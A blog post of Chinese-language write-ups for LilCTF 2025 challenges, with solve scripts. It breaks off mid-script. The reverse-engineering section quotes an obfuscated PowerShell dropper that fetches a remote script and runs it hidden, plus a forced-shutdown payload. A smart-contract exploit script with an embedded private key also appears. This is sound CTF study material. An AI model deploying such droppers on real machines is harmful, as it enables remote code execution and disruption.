---
title: LilCTF 2025 题解
date: '2025-08-19'
description: 第一次也是最后一次 LilCTF。
tags:
  - 安全
  - CTF
  - 题解
draft: false
permalink: /lilctf-wp
comments: true
---

# 题解

我们的队伍「我们不可能成为CTF糕手！绝对不行。（※似乎可行？）」

仅上传了我的部分。

出于对象储存的流量消耗原因~其实是懒~，删除了所有 FLAG 截图。

## Blockchain

### 生蚝的宝藏

预感这道题不会很难，应该是智能合约审查。 Blockchain 这东西大家估摸着都没什么基础，要做的很难应该被放在密码学之类的地方吧？

所以，我很自信地认为依靠互联网和AI是能在几个小时内把这道题磨出来的。

虽然过程很丑陋，完全是 AI 先教会我最基础的 Web3 工具链怎么用，再帮我审查合约。我除了纠错基本没有动脑……

找到 Hash 的漏洞比较容易，因为一切都被明文给出。

感觉关键点还是逆向的做法：找出字符串A，然后再找加密方式，做逆运算 or 复现加密算法得到字符串B。

#### 按照要求完成转账（热身）

步骤1是给你注册一个新的账号：

```
[+] deployer account: 0x6d3dbBCdFd06fD556fA68D89306ce480e59F8191

[+] token: v4.local.kO8wId2nymSOvDM06FgD4DPyZ4GJIbGhEcyFrTgJSs7xVR5y096ZMWRN5MGIMwmbvLyLYSsbAbt5wXYRZGHW99Yw7FoeEf8C7_NcAzzDTxRnBTspCDpjvQICz6yqX2I1Ydi1sLuC1_c8sbCWwgfJ067TnHyQcG2DfkEXLAEPyuC5_A.T3lzdGVyVHJlYXN1cmU
```

在 Gemini 指导下了解了 PRC 和 水龙头，并安装了 Foundry。

从水龙头里得到以太币。粘贴进去就好了。

步骤二是转账。会在这个账号部署智能合约。

#### 还原合约的处理（又是逆向）

从 `cast code 0xb17b9BB32B58033c57194eA5ce35fb0e5b4BaaFA --rpc-url http://106.15.138.99:8545/` 获取合约的字节码。

使用 https://www.ethervm.io/decompile 逆向它。

咨询 GPT，得到逻辑：

```
读取参数，读取密钥 k，
k << 0xa1，
treasure XOR k，
进行 `keccak256(参数)` == keccak256(treasure XOR k) 的比较，
相等则返回 1
```

#### 解密

`keccak256( payload XOR (K << 0xa1) ) == keccak256(secret)` 中的

`payload = secret XOR (K << 0xa1)`

其中：

```asm
PUSH12 0x35b2bcaf9a9b9b1c1b331ab3
SHL    0xa1
```

AI 一开始并不在乎这个左移。经过提示左移这个流程后，AI 写出了正确的代码：

```python
import os
from web3 import Web3
from web3.exceptions import ContractLogicError
from eth_abi import encode
from eth_utils import keccak

# RPC 节点 URL
RPC_URL = "http://106.15.138.99:8545/"
# 你的账户私钥 (前面加上 '0x')
PRIVATE_KEY = "0xc842870712017b863efc650d0fda5ffd3b3f56248c51f1b34a4b009a0cdf82ac"
# 目标合约地址
CONTRACT_ADDRESS = "0xb17b9BB32B58033c57194eA5ce35fb0e5b4BaaFA"

# --- 合约 ABI (最小化) ---
MINIMAL_ABI = [{"inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}], "stateMutability": "view", "type": "function"}]

def decode_storage_bytes(w3: Web3, contract_address: str, slot0: bytes) -> bytes:
    """
    根据 Solidity 的 bytes 存储布局解码数据。
    """
    # 检查最后一个字节的最低位来判断编码方式
    if slot0[-1] & 1 == 0:  # 短字节数组 (short bytes array), 最低位为 0
        length = slot0[-1] >> 1
        return slot0[:length]
    else:  # 长字节数组 (long bytes array), 最低位为 1
        length = (int.from_bytes(slot0, 'big') - 1) // 2
        data_start_slot = int.from_bytes(keccak(int.to_bytes(0, 32, 'big')), 'big')

        full_data = b''
        num_slots_to_read = (length + 31) // 32

        for i in range(num_slots_to_read):
            slot_content = w3.eth.get_storage_at(contract_address, data_start_slot + i)
            full_data += slot_content

        return full_data[:length]

def encrypt_treasure(treasure: bytes, key: bytes) -> bytes:
    """
    【核心】根据合约的解密逻辑，正确地加密 treasure 以生成 payload。

    合约的解密逻辑 (`func_0112`) 在使用密钥前，会执行一次关键的位移操作：
    `key_data = key << 161` (SHL opcode with 0xa1)

    因此，我们的加密函数也必须使用这个经过位移后的密钥。
    解密操作是简单的 XOR，其逆运算也是 XOR。
    """
    print("[*] 正在使用最终的加密算法 (Key Shift then XOR)...")

    # 1. 将 12 字节的原始密钥转换为整数
    key_int = int.from_bytes(key, 'big')

    # 2. 【关键】执行和合约完全相同的左移 161 位操作
    shifted_key_int = key_int << 161

    # 3. 将位移后的结果转换回 32 字节，这是真正的密钥
    real_key = shifted_key_int.to_bytes(32, 'big')
    print(f"[*] 计算出的真实密钥 (32 bytes): {real_key.hex()}")

    # 4. 使用这个真实密钥进行 XOR 加密
    # 注意：合约中的循环模数仍然是 12 (0x0c)
    payload = bytearray(len(treasure))
    key_len = 12

    for i in range(len(treasure)):
        key_byte = real_key[i % key_len]
        payload[i] = treasure[i] ^ key_byte

    return bytes(payload)

def main():
    """
    主执行函数
    """
    # 1. 连接到区块链
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    if not w3.is_connected():
        print("错误：无法连接到 RPC 节点！")
        return

    # 2. 设置账户
    if not PRIVATE_KEY:
        print("错误：请设置 PRIVATE_KEY 环境变量！")
        return
    account = w3.eth.account.from_key(PRIVATE_KEY)
    sender_address = account.address
    print(f"[*] 使用账户: {sender_address}")

    # 3. 实例化合约
    checksum_contract_address = Web3.to_checksum_address(CONTRACT_ADDRESS)
    contract = w3.eth.contract(address=checksum_contract_address, abi=MINIMAL_ABI)

    # 4. 攻击前检查状态
    is_solved_before = contract.functions.isSolved().call()
    print(f"[*] 攻击前, isSolved() 返回: {is_solved_before}")
    if is_solved_before:
        print("[*] 合约已解决，无需再次攻击。")
        return

    print("\n--- 开始构造 Payload ---")

    # 5. 从链上读取 storage slot 0
    slot0_data = w3.eth.get_storage_at(checksum_contract_address, 0)
    print(f"[*] 读取 Storage Slot 0: {slot0_data.hex()}")

    # 6. 解码得到 treasure
    treasure = decode_storage_bytes(w3, checksum_contract_address, slot0_data)
    print(f"[*] 解码后的 Treasure (长度: {len(treasure)} bytes): {treasure.hex()}")

    # 7. 使用密钥进行加密
    key = bytes.fromhex("35b2bcaf9a9b9b1c1b331ab3")
    payload = encrypt_treasure(treasure, key) # 调用正确的加密函数
    print(f"[*] 计算出的 Payload (长度: {len(payload)} bytes): {payload.hex()}")

    # 8. ABI 编码生成最终的 calldata
    selector = bytes.fromhex("5cc4d812")
    exploit_calldata = selector + encode(['bytes'], [payload])
    print(f"[*] 最终生成的 Calldata: {exploit_calldata.hex()}")

    print("--- Payload 构造完毕 ---\n")

    # 9. 发送交易
    print("[*] 正在准备攻击交易...")
    try:
        tx_params_for_estimate = {
            'to': checksum_contract_address,
            'from': sender_address,
            'data': exploit_calldata,
            'nonce': w3.eth.get_transaction_count(sender_address),
            'chainId': w3.eth.chain_id
        }

        estimated_gas = w3.eth.estimate_gas(tx_params_for_estimate)
        print(f"[*] 自动估算 Gas: {estimated_gas}")

        tx_params = {
            **tx_params_for_estimate,
            'gas': int(estimated_gas * 1.2), # 增加 20% 的 buffer 防止估算不准
            'gasPrice': w3.eth.gas_price
        }

        signed_tx = w3.eth.account.sign_transaction(tx_params, PRIVATE_KEY)
        tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)

        print(f"[*] 交易已发送, 哈希: {tx_hash.hex()}")
        print("[*] 等待交易确认...")
        receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)

        if receipt.status == 1:
            print("[+] 交易成功！")
        else:
            print("[-] 交易失败！收据状态为 0。")
            return

    except ContractLogicError as e:
        print(f"\n[-] 交易失败！合约逻辑错误 (Revert)。")
        print(f"    失败原因: {e}")
        return
    except Exception as e:
        print(f"\n[-] 发生未知错误: {e}")
        return

    # 10. 攻击后检查状态
    is_solved_after = contract.functions.isSolved().call()
    print(f"[*] 攻击后, isSolved() 返回: {is_solved_after}")
if __name__ == "__main__":
    main()
```

## Crypto

### ez_math

解密脚本如下：

原理为相似矩阵特征值一致

```python
# 导入必要的库
from sage.all import *
from Crypto.Util.number import long_to_bytes

# 题目给出的已知信息
p = 9620154777088870694266521670168986508003314866222315790126552504304846236696183733266828489404860276326158191906907396234236947215466295418632056113826161
C_flat = [7062910478232783138765983170626687981202937184255408287607971780139482616525215270216675887321965798418829038273232695370210503086491228434856538620699645, 7096268905956462643320137667780334763649635657732499491108171622164208662688609295607684620630301031789132814209784948222802930089030287484015336757787801, 7341430053606172329602911405905754386729224669425325419124733847060694853483825396200841609125574923525535532184467150746385826443392039086079562905059808, 2557244298856087555500538499542298526800377681966907502518580724165363620170968463050152602083665991230143669519866828587671059318627542153367879596260872]

# 1. 在有限域 GF(p) 上构建矩阵 C
F = GF(p)
C = matrix(F, 2, 2, C_flat)

# 2. 计算矩阵 C 的特征值
eigenvalues = C.eigenvalues()
print(f"找到的特征值: {eigenvalues}")

# 3. 将特征值从整数转换回字节
lambda1_recovered = int(eigenvalues[0])
lambda2_recovered = int(eigenvalues[1])

part1 = long_to_bytes(lambda1_recovered)
part2 = long_to_bytes(lambda2_recovered)

# 4. 拼接两部分得到 flag
# 注意：不知道原始顺序，所以两种组合都试一下
flag_part1 = part1 + part2
flag_part2 = part2 + part1

print(f"可能的 Flag 1: {flag_part1}")
print(f"可能的 Flag 2: {flag_part2}")

# 将其包装成完整的 flag 格式
print(f"最终 Flag 1: LILCTF{{{flag_part1.decode()}}}")
print(f"最终 Flag 2: LILCTF{{{flag_part2.decode()}}}")
```

## Misc

### PNG_Master

#### flag1

用 `strings` 扫一遍，在末尾得到：

```
6K6p5L2g6Zq+6L+H55qE5LqL5oOF77yM5pyJ5LiA5aSp77yM5L2g5LiA5a6a5Lya56yR552A6K+05Ye65p2lZmxhZzE6NGM0OTRjNDM1NDQ2N2I=
```

显然是 base64，解码后得到：

```
让你难过的事情，有一天，你一定会笑着说出来flag1:4c494c4354467b
```

#### flag2

我们使用 `zstag -a` 扫描，重点关注红色部分，第一个便是：

```
b1,rgb,lsb,xy       .. text: "5Zyo5oiR5Lus5b+D6YeM77yM5pyJ5LiA5Z2X5Zyw5pa55piv5peg5rOV6ZSB5L2P55qE77yM6YKj5Z2X5Zyw5pa55Y+r5YGa5biM5pybZmxhZzI6NTkzMDc1NWYzNDcyMzM1ZjRk"
```

看起来也许是 base64，尝试解码：

```
在我们心里，有一块地方是无法锁住的，那块地方叫做希望flag2:5930755f3472335f4d
```

#### flag3

到这里就没什么头绪了，尝试把 zstag 的输出给 Gemini 看，提示我还有 zlib 数据没提取出来。

那我们就 `binwalk -e` 一下：

```
54            0x36            Zlib compressed data, default compression
317           0x13D           Zlib compressed data, default compression
456639        0x6F7BF         Zlib compressed data, default compression
```

依次 `zlib-flate -uncompress` 把二进制数据解一次。然后再 `xxd` 把文件头给 Gemini 看。

Gemini 发现 `0x6F7BF` 是压缩包，`0x36` 只是一个色彩文件。

所以我们改 `0x6F7BF` 后缀，解压得到 `hint.txt` 和 `secret.bin`。根据 `hint.txt` ，我们知道 flag 就在 `secret.bin` 里面。

在 ctf-wiki, gemini 和 vscode 的帮助下发现 `hint.txt` 是零宽字符隐写，我们去找工具。

##### 提示1：与文件名 XOR

发现：https://www.guofei.site/pictures_for_blog/app/text_watermark/v1.html 能够提取出 `与文件名XOR` 的密文。

##### 提示2：后缀不算文件名

脚本怎么不对劲，回看题目，发现作者提示后缀不算文件名。

修改后脚本如下：

```python
# -*- coding: utf-8 -*-

def solve_secret():
    """
    读取 secret.bin 文件，并使用文件名作为密钥进行逐字节异或操作，
    最后输出解密后的字符串。
    """
    filename = 'secret.bin'

    try:
        # 将文件名 without .bin 转换为字节，作为异或操作的密钥
        key = 'secret'.encode('utf-8')
        key_length = len(key)

        # 以二进制模式读取文件内容
        with open(filename, 'rb') as f:
            encrypted_data = f.read()

        # 创建一个 bytearray 来存储解密后的数据
        decrypted_data = bytearray()

        # 遍历加密数据的每一个字节
        for i in range(len(encrypted_data)):
            # 使用 (i % key_length) 来循环使用密钥
            # 对加密字节和密钥字节进行异或操作
            decrypted_byte = encrypted_data[i] ^ key[i % key_length]
            decrypted_data.append(decrypted_byte)

        # 尝试将解密后的字节数据用 utf-8 解码为字符串并打印
        try:
            final_string = decrypted_data.decode('utf-8')
            print(final_string)
        except UnicodeDecodeError:
            print("解密完成，但无法使用 UTF-8 解码为可读字符串。")
            print("这可能是因为源文件不是文本文件，或者密钥不正确。")
            print("将以原始字节形式展示：")
            print(decrypted_data)

    except FileNotFoundError:
        print(f"错误：文件 '{filename}' 不存在。")
        print("请确保脚本和 secret.bin 文件在同一个目录下。")
    except Exception as e:
        print(f"发生了一个未知错误：{e}")

if __name__ == '__main__':
    solve_secret()

```

就此得到 flag3。

#### 最终的解密

```
flag1:4c494c4354467b
flag2:5930755f3472335f4d
flag3:61733765725f696e5f504e477d
```

hex2ascii 即可。

## Reverse

### 1'M no7 A rO6oT

对于这种题目，似乎再怎么混淆都是要打回原形进行执行的，总结就是*别执行*执行危险代码的那一部分，但是*要执行*从混淆的代码还原回来的那一部分。

起手一个 `strings` 剥离出 <script> 内的脚本，去掉最后的执行而是让它打印。

```sh
candlest@yl15prow /m/d/L/Re> strings ./Coloringoutomic_Host.mp3 | grep script
<script>...</script>
```

得到：

```powershell
powershell.exe -w 1 -ep Unrestricted -nop iexStart-Process "$env:SystemRoot\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle Hidden -ArgumentList '-w','h','-ep','Unrestricted','-Command',"Set-Variable 3 'http://challenge.xinshi.fun:30805/bestudding.jpg';SI Variable:/Z4D 'Net.WebClient';cd;SV c4H (.`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member)[2].Name).Invoke(`$ExecutionContext.InvokeCommand.((`$ExecutionContext.InvokeCommand|Get-Member|Where{(GV _).Value.Name-clike'*dName'}).Name);&([ScriptBlock]::Create((Get-Variable c4H -ValueO).((Get-Variable A).Value).Invoke((Variable 3 -Val))))";
```

继续分析：`$webClient = New-Object System.Net.WebClient; $url = 'http://challenge.xinshi.fun:30805/bestudding.jpg'; $content = $webClient.DownloadString($url); Write-Output $content` 得到：

```powershell
"..."  |  .$r
```

猜测 `.$r` 是 `iex` 我们换成 `Write-Output`，得到一个很长的字符数组，再次替换 `iex` 得到：

```powershell
$DebugPreference = $ErrorActionPreference = $VerbosePreference = $WarningPreference = "SilentlyContinue"

[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
[void] [System.Reflection.Assembly]::LoadWithPartialName("System.Drawing")

shutdown /s /t 600 >$Null 2>&1

$Form = New-Object System.Windows.Forms.Form
$Form.Text = "Ciallo～(∠·ω< )⌒★"
$Form.StartPosition = "Manual"
$Form.Location = New-Object System.Drawing.Point(40, 40)
$Form.Size = New-Object System.Drawing.Size(720, 480)
$Form.MinimalSize = New-Object System.Drawing.Size(720, 480)
$Form.MaximalSize = New-Object System.Drawing.Size(720, 480)
$Form.FormBorderStyle = "FixedDialog"
$Form.BackColor = "#0077CC"
$Form.MaximizeBox = $False
$Form.TopMost = $True


$fF1IA49G = "LILCTF{b3_v1GlLAnT_a6AlNST_PhIShINg}"
$fF1IA49G = "N0pe"


$Label1 = New-Object System.Windows.Forms.Label
$Label1.Text = ":)"
$Label1.Location = New-Object System.Drawing.Point(64, 80)
$Label1.AutoSize = $True
$Label1.ForeColor = "White"
$Label1.Font = New-Object System.Drawing.Font("Consolas", 64)

$Label2 = New-Object System.Windows.Forms.Label
$Label2.Text = "这里没有 flag；这个窗口是怎么出现的呢，flag 就在那里"
$Label2.Location = New-Object System.Drawing.Point(64, 240)
$Label2.AutoSize = $True
$Label2.ForeColor = "White"
$Label2.Font = New-Object System.Drawing.Font("微软雅黑", 16)

$Label3 = New-Object System.Windows.Forms.Label
$Label3.Text = "你的电脑将在 10 分钟后关机，请保存你的工作"
$Label3.Location = New-Object System.Drawing.Point(64, 300)
$Label3.AutoSize = $True
$Label3.ForeColor = "White"
$Label3.Font = New-Object System.Drawing.Font("微软雅黑", 16)

$Form.Controls.AddRange(@($Label1, $Label2, $Label3))

$Form.Add_Shown({$Form.Activate()})
$Form.Add_FormClosing({
    $_.Cancel = $True
    [System.Windows.Forms.MessageBox]::Show("不允许关闭！", "提示", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
})

$Form.ShowDialog() | Out-Null
```

没有触发关机，我们成功地得到了 flag。

### ARM ASM

最近的大创也有安卓逆向的部分，所以先用 jadx 随便翻翻源代码，发现 MainActivity 用到了 `libez_asm_hahaha.so` 里面的 `String check(String str)` 函数。

于是提取出 `libez_asm_hahaha.so`，遗憾的是 IDA-Free 不能分析 ARM 架构的文件，于是只能用之前在看雪找的 IDA Pro 9.1，装上 IDA-Pro-MCP 开始分析。

其中短暂地被 k=114514...... 这个变量误导，但是好在 Gemini 能够成功找到关键文件。不过，它却不能正确理解 `vqtbl1q_s8` 这个伪指令。反正是和 Gemini 纠缠了好久，最后尝试让 Gemini 带着我把 `check` 相关的汇编读一遍，才发现 `libez_asm_hahaha.so` 更改了 `base64` 的顺序，自己写出了除了*密码块链接*以外的代码，只有 1/3 的 FLAG 是对的，我并不知道第二第三块密码中的 t 是怎么变化的。

最后是手动 RAG 喂给 GPT-5，乘着没降智把正确的逻辑找出来了：

```
v5 = vld1q_dup_s8(v4); (行 31): 将轮号 i 加载到向量 v5 的所有16个字节中。
t = veorq_s8(t, v5); (行 32): t 与轮号 i 异或，为下一轮做准备。
```

t 在三轮中并不会“循环移位”，而是每轮末用按位异或更新：t := t XOR round_index（round_index 为该轮的轮号，0,1,2）。
由于更新发生在“处理完当前块之后”，所以用于第 i 个块的 t 为:

```
块 0：t0
块 1：t0
块 2：t0 XOR 0x01
```

顺利补完脚本如下：

```python
import base64
from collections import deque


tab1 = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ3456780129+/"

tab2 = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

TRANS_TABLE = bytes.maketrans(tab1, tab2)

# t 的初始值 (t0)
t0 = bytes([0x0D, 0x0E, 0x0F, 0x0C, 0x0B, 0x0A, 0x09, 0x08, 0x06, 0x07, 0x05, 0x04, 0x02, 0x03, 0x01, 0x00])

# 最终的 Base64 字符串
final = "KRD2c1XRSJL9e0fqCIbiyJrHW1bu0ZnTYJvYw1DM2RzPK1XIQJnN2ZfRMY4So09S"

# 1. Base64 解码 (with custom alphabet correction)

standard_b64_string = final.encode('ascii').translate(TRANS_TABLE)

encrypted = base64.b64decode(standard_b64_string)

print(f"[*] 解码后的密文 (hex): {encrypted.hex()}")

# 2. 逆向按位旋转 (ROL -> ROR)
EncryptedData = bytearray()
for i in range(0, len(encrypted), 3):
    chunk = encrypted[i:i+3]
    b0 = ((chunk[0] >> 3) | (chunk[0] << 5)) & 0xFF
    b1 = ((chunk[1] >> 7) | (chunk[1] << 1)) & 0xFF
    b2 = chunk[2]
    EncryptedData.extend([b0, b1, b2])

print(f"[*] 逆向旋转后的中间结果: {bytes(EncryptedData).hex()}")

# 3. 逆向置换
def unshuffle_block(shuffled_block, shuffle_map):
    """
    逆向 TBL 置换操作。汇编的 TBL 是：y[j] = x[ t[j] ]
    因此逆置换是：x[i] = y[ j ]，其中 j 满足 t[j] = i
    """
    original_block = bytearray(16)
    if len(shuffle_map) != 16 or len(set(shuffle_map)) != 16 or max(shuffle_map) > 15:
        raise ValueError(f"Invalid shuffle map: not a permutation of 0-15. Map: {shuffle_map.hex()}")
    # 反置换表
    inv = [0]*16
    for j, val in enumerate(shuffle_map):
        inv[val] = j
    for i in range(16):
        original_block[i] = shuffled_block[inv[i]]
    return bytes(original_block)

plaintext = b""
encrypted_blocks = [EncryptedData[i:i+16] for i in range(0, len(EncryptedData), 16)]

n = 0  # 累积异或掩码，初始为 0
for i, block in enumerate(encrypted_blocks):
    # 本轮使用的 t
    t_map = bytes([b ^ n for b in t0])
    print(f"\n--- 解密第 {i+1} 块 ---")
    print(f"  [*] 使用的 t = t0 ^ {n:#02x} -> {t_map.hex()}")

    # 步骤 A: 先去掉异或
    after_xor = bytes([b ^ t for b, t in zip(block, t_map)])
    print(f"  [*] 逆向异或后: {after_xor.hex()}")

    # 步骤 B: 逆向置换（TBL 的逆运算）
    plain_block = unshuffle_block(after_xor, t_map)
    print(f"  [*] 逆向置换后(明文块): {plain_block.hex()}")

    plaintext += plain_block

    # 更新下一轮的掩码：与本轮轮号异或（注意：更新发生在本轮之后）
    n ^= i

print(f"[*] 完整明文 (hex): {plaintext.hex()}")
print(f"[*] 完整明文 (ascii): {plaintext.decode(errors='ignore')}")
```

### Oh_My_Uboot

Bootloader，从 `0x60800000` 重新开始的世界。

#### 也许可行：qemu 动态调试

倒在了 msys2 的 gdb 不能正常加载脚本的问题上。不过找到了正确的 PASSWORD 提示词。

#### 换汤不换药：输入验证

```
启动入口点 (0x60800000)
  ↓
硬件初始化 (sub_6080033C)
  ↓
主要初始化 (sub_60801810)
  ↓
初始化设置 (sub_60817844)
  ↓
初始化调用器 (sub_60859DEC)
  ↓
事件处理 (sub_60819F4C)
  ↓
事件分发器 (sub_60819E68)
  ↓
......
  ↓
sub_60813F74() - 密码验证函数
```

在 GLM + IDA-Pro-MCP 的帮助下速览伪代码，发现一个奇怪的函数：

```c
void sub_60813F74()
{
  int n37; // r3
  _BYTE *v1; // r2
  int n13; // r0
  int v3; // r4
  char n13_1; // r5
  _BYTE v5[4]; // [sp+0h] [bp-88h] BYREF
  _BYTE v6[52]; // [sp+4h] [bp-84h] BYREF
  _BYTE result[38]; // [sp+38h] [bp-50h] BYREF
  char v8; // [sp+5Eh] [bp-2Ah] BYREF

  while ( dword_608864E4 )
  {
    sub_60801CFC(result, (unsigned int)&unk_6086D357, 38, dword_608864E4);
    sub_60801C20(&v8, 0, 26);
    n37 = 0;
    v1 = result;
    do
    {
      ++n37;
      *v1++ ^= 0x72u;
    }
    while ( n37 != 37 );
    n13 = sub_6081886C(result);
    v3 = 0;
    while ( 1 )
    {
      n13 = sub_60818848(n13);
      n13_1 = n13;
      if ( (unsigned __int8)n13 == 13 )
        break;
      if ( (unsigned __int8)n13 == 8 )
      {
        if ( v3 > 0 )
        {
          sub_608188E4((unsigned __int8)n13);
          sub_608188E4(32);
          n13 = sub_608188E4(8);
          --v3;
        }
      }
      else
      {
        n13 = sub_608188E4(42);
        v5[v3 + 56] = n13_1;
        ++v3;
      }
    }
    v5[v3 + 56] = 0;
    sub_608188E4(10); // 换行符？
    sub_60813E3C((unsigned int)result, v6); // 验证
    if ( !sub_60864138(v6, "5W2b9PbLE6SIc3WP=X6VbPI0?X@HMEWH;") ) // flag 在这里
      // 只是strcmp
      dword_608864E4 = 0;
  }
}
```

通过一段异或在运行时构建出了 password 提示词，同时找回了失落的验证函数。

并没有逻辑拆分，并没有密文混淆，只是 XOR + Base58 。我们只需要解码 Base58 再 XOR 即可。

这次学聪明了确认一下是不是自建的 base58 码表。是的，而且也是运行时构建。

`sub_60813E3C` 中 base58 码表的构建：

```c
LOBYTE(n106) = 48;
v9 = &v25;
do
{
  *v9++ = n106;
  n106 = (unsigned __int8)(n106 + 1);
}
while ( n106 != 106 );
```

然后是与 `0x72 XOR`。

确认逻辑没问题，让 GLM 写脚本如下：

```python
# 1. 定义与加密函数完全一致的自定义字母表
# ASCII 码从 48 ('0') 到 105 ('i')
CUSTOM_ALPHABET = "".join([chr(i) for i in range(48, 106)])

# 创建一个反向查找表，用于快速获取字符对应的数值
CHAR_MAP = {char: index for index, char in enumerate(CUSTOM_ALPHABET)}

def base58_decode(encoded_string: str) -> bytes:
    """
    使用自定义字母表将 Base58 字符串解码为字节数组。
    """
    large_int = 0

    # 将字符串主体部分转换为大整数
    for char in encoded_string:
        if char not in CHAR_MAP:
            raise ValueError(f"无效字符 '{char}' 不在自定义字母表中")
        value = CHAR_MAP[char]
        large_int = large_int * 58 + value

    # 将大整数转换为字节数组（大端序）
    # (large_int.bit_length() + 7) // 8 用于计算所需的最少字节数
    decoded_bytes = large_int.to_bytes((large_int.bit_length() + 7) // 8, 'big')

    # 处理前导零
    # 编码前的每个 '\x00' 字节对应编码后的一个字母表首字符 ('0')
    leading_zeros = 0
    for char in encoded_string:
        if char == CUSTOM_ALPHABET[0]:
            leading_zeros += 1
        else:
            break

    # 在结果前添加相应数量的 '\x00' 字节
    return b'\x00' * leading_zeros + decoded_bytes

def xor_decrypt(data: bytes, key: int) -> bytes:
    """
    对字节数组的每个字节执行 XOR 操作。
    """
    return bytes([b ^ key for b in data])

# --- 主程序 ---
# 要解密的字符串 (来自 sub_60813F74 的硬编码值)
encrypted_string = "5W2b9PbLE6SIc3WP=X6VbPI0?X@HMEWH;"
# 加密/解密密钥
xor_key = 0x72

try:
    # 第1步：Base58 解码
    intermediate_data = base58_decode(encrypted_string)
    print(f"[*] Base58 解码后的中间数据 (hex): {intermediate_data.hex()}")

    # 第2步：XOR 解密
    original_data = xor_decrypt(intermediate_data, xor_key)
    print(f"[*] XOR 解密后的原始数据 (hex): {original_data.hex()}")

    # 尝试将原始数据解码为文本 (如果它是可打印字符)
    try:
        print(f"\n[+] 最终解密结果 (文本): {original_data.decode('utf-8')}")
    except UnicodeDecodeError:
        print("\n[+] 最终解密结果不是有效的 UTF-8 文本。")

except ValueError as e:
    print(f"[!] 解密失败: {e}")
```

### Qt_Creator

我最爱的 Qt 框架。

#### 从字符串开始

大概流程是：

```
sub_411430 -> sub_4113A0 -> sub_410100 -> sub_40FFF0
```

安装程序弹出验证窗口，根据字符串名称找到模态对话框代码，进而找到 `sub_40FFF0` 这一关键的函数。它实现了对 QString （引用计数器混淆视听）的解密，具体逻辑为奇数位置-1 偶数位置+1。

但是还是没有头绪，不妨把 `LILCTF{` 加密后开始搜索字符串算了。

#### 顺藤摸瓜

顺藤摸瓜找到了：

```
.rdata:0041BE1C aKjkds          db 'KJKDS',0            ; DATA XREF: sub_40EE30+55↑o
.rdata:0041BE22 aGzr6           db 'GzR6`',0            ; DATA XREF: sub_40EE30+6C↑o
.rdata:0041BE28 aBsd5s          db 'bsd5s',0            ; DATA XREF: sub_40EE30+89↑o
.rdata:0041BE2E a1q0t           db '1q`0t',0            ; DATA XREF: sub_40EE30+A6↑o
.rdata:0041BE34 aWdsx           db '^wdsx',0            ; DATA XREF: sub_40EE30+C3↑o
.rdata:0041BE3A aB1mw           db '`b1mw',0            ; DATA XREF: sub_40EE30+E0↑o
.rdata:0041BE40 a2oh4mu         db '2oh4mu|',0          ; DATA XREF: sub_40EE30+FD↑o
```

这大概是密钥密文，因为 `KJKDS` 就是 `LILCT`。

顺藤摸瓜找到 `sub_40EE30`，这 7 组字符最后被顺序拼接。

但是如果直接按照奇数位置-1 偶数位置+1的规则，解密出来是

`LILCTHyS5acre4t2pa/u_veryaa2lx3ni3nt}`

这个时候我们发现 G 的前一个字符是 F，那么我们把规则反过来就好了。

提示 Gemini 修改脚本如下：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
模拟demo_code_editor.exe中的字符串解密过程
根据sub_40EE30和sub_40FFF0函数的逻辑编写
"""

def decrypt_string(encrypted_str, algorithm="standard"):
    """
    模拟sub_40FFF0函数的解密算法
    algorithm参数：
    - "standard": 奇数位置字符+1，偶数位置字符-1
    - "reverse": 奇数位置字符-1，偶数位置字符+1
    - "all_plus": 所有字符+1
    - "all_minus": 所有字符-1
    """
    result = []
    for i, char in enumerate(encrypted_str):
        if algorithm == "standard":
            if i % 2 == 0:  # 奇数位置（0-based）
                decrypted_char = chr(ord(char) + 1)
            else:  # 偶数位置
                decrypted_char = chr(ord(char) - 1)
        elif algorithm == "reverse":
            if i % 2 == 0:  # 奇数位置（0-based）
                decrypted_char = chr(ord(char) - 1)
            else:  # 偶数位置
                decrypted_char = chr(ord(char) + 1)
        elif algorithm == "all_plus":
            decrypted_char = chr(ord(char) + 1)
        elif algorithm == "all_minus":
            decrypted_char = chr(ord(char) - 1)
        else:
            raise ValueError(f"Unknown algorithm: {algorithm}")
        result.append(decrypted_char)
    return ''.join(result)

def simulate_sub_40EE30():
    """
    模拟sub_40EE30函数中的字符串拼接过程
    """
    print("=== 模拟sub_40EE30函数的字符串拼接过程 ===\n")

    # 初始化加密字符串（对应this[7]到this[13]）
    encrypted_strings = [
        "KJKDS",   # this[7] - 第1段（奇数段）
        "GzR6`",   # this[8] - 第2段（偶数段）
        "bsd5s",   # this[9] - 第3段（奇数段）
        "1q`0t",   # this[10] - 第4段（偶数段）
        "^wdsx",   # this[11] - 第5段（奇数段）
        "`b1mw",   # this[12] - 第6段（偶数段）
        "2oh4mu|"  # this[13] - 第7段（奇数段）
    ]

    print("原始加密字符串:")
    for i, s in enumerate(encrypted_strings):
        segment_type = "奇数段" if (i+1) % 2 == 1 else "偶数段"
        print(f"  this[{i+7}]: \"{s}\" ({segment_type})")

    # 模拟字符串拼接过程
    print("\n=== 字符串拼接过程 ===")

    # 第一步：初始化 this[7] 作为基础字符串
    combined = encrypted_strings[0]  # "KJKDS"
    print(f"步骤1: 初始化基础字符串 = \"{combined}\"")

    # 逐步拼接后续字符串
    for i in range(1, 6):  # 拼接前6个字符串到this[14]
        next_str = encrypted_strings[i]
        combined += next_str
        print(f"步骤{i+1}: 拼接 \"{next_str}\" -> \"{combined}\"")

    # this[14] 赋值为拼接前6个字符串的结果
    a1_14_value = combined
    print(f"\n=== a1[14]赋值完成 ===")
    print(f"a1[14] = \"{a1_14_value}\"")
    print(f"长度: {len(a1_14_value)}")

    # 注意：第7个字符串("2oh4mu|")是在a1[14]赋值后才拼接的
    print(f"\n注意: 第7个字符串 \"{encrypted_strings[6]}\" 是在a1[14]赋值后才拼接的")

    return a1_14_value, encrypted_strings

def simulate_sub_410100(encrypted_str):
    """
